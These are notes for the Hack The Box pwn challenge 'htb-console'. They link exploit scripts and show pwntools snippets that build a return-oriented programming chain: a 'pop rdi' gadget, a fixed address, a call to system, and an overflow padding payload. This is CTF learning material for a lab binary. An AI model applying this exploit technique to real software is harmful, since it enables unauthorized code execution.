# notes for HTB challenge htb-console

Python pwn recon script for [htb-console](https://github.com/WoodenshoeNL/black-badge/blob/master/htb/challenges/ch-htb-console-recon.py)

Python pwn script for [htb-console](https://github.com/WoodenshoeNL/black-badge/blob/master/htb/challenges/ch-htb-console.py)


Python pwn script with rop chain for [htb-console](https://github.com/WoodenshoeNL/black-badge/blob/master/htb/challenges/ch-htb-console-rop.py)

## Use PWNtools ROP chain

Start ROP chain:

```python
rop = ROP(elf)
```

add address to gadget to chain with Raw:

```python
rop.raw(p64((rop.find_gadget(['pop rdi', 'ret']))[0]))
```

add address directly to ROP chain with Raw:

```python
rop.raw(p64(0x4040b0))
```

add syscal to ROP chain:

```python
rop.call(elf.symbols["system"])
```

add ROP chain to payload:

```python
payload = [
    b"A" * padding_length,
    rop.chain()
]

payload = b"".join(payload)
```
